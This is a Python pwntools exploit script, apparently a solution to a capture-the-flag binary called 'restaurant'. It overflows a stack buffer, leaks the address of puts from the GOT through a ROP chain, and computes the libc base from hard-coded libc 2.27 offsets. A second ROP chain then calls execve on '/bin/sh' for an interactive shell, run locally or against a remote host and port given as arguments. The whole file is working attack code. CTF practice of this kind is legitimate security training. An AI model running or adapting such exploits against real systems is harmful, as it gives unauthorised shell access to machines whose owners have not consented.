#!/usr/bin/env python3

from pwn import *

def Main(socket=None):
    context.binary = "/home/vagrant/Downloads/pwn_restaurant/restaurant"

    if not socket:
        proc = process()
        GDB(proc)

    else:
        ip, port = socket
        proc = remote(ip, int(port))

    puts_plt = p64(0x400650)
    puts_got = p64(0x601fa8)

    pop_rdi = p64(0x00000000004010a3) # pop rdi ; ret
    pop_rsi = p64(0x00000000004010a1) # pop rsi ; pop r15 ; ret

    func_fill = p64(0x0000000000400e4a)

    proc.writeline("1")

    # ~ proc.writeline(cyclic(128))
    overflow = b"i" * cyclic_find(0x6161616b)

    ## call puts to write puts@got (ptr to puts@libc) and return to fill func
    buff = overflow
    buff += pop_rdi
    buff += puts_got
    buff += puts_plt
    buff += func_fill

    proc.writeline(buff)

    proc.readuntil(overflow + pop_rdi.strip(b'\x00'))

    puts_libc = proc.readline().strip()

    while len(puts_libc) < 8:
        puts_libc += b'\x00'

    puts_libc = u64(puts_libc)

    print("puts@libc:", hex(puts_libc))


    ## https://libc.nullbyte.cat/?q=puts%3Aaa0&l=libc6_2.27-3ubuntu1.4_amd64
    puts_libc_offset   = 0x080aa0
    bin_sh_libc_offset = 0x1b3e1a
    execve_libc_offset = 0x0e4c00

    libc_base = puts_libc - puts_libc_offset

    bin_sh_libc = p64(libc_base + bin_sh_libc_offset)
    execve_libc = p64(libc_base + execve_libc_offset)


    buff = overflow
    buff += pop_rdi
    buff += bin_sh_libc
    buff += pop_rsi
    buff += p64(0) # null execve argv
    buff += p64(0) # r15
    buff += execve_libc

    proc.writeline(buff)

    proc.interactive()



def GDB(proc):
    script = list()
    script.append("break *fill+162")
    script.append("continue")
    script.append("")

    script = '\n'.join(script)

    gdb.attach(proc, script)


if __name__ == "__main__":
    argv = sys.argv

    if len(argv) > 2:
        Main((argv[1], argv[2]))

    else:
        Main()
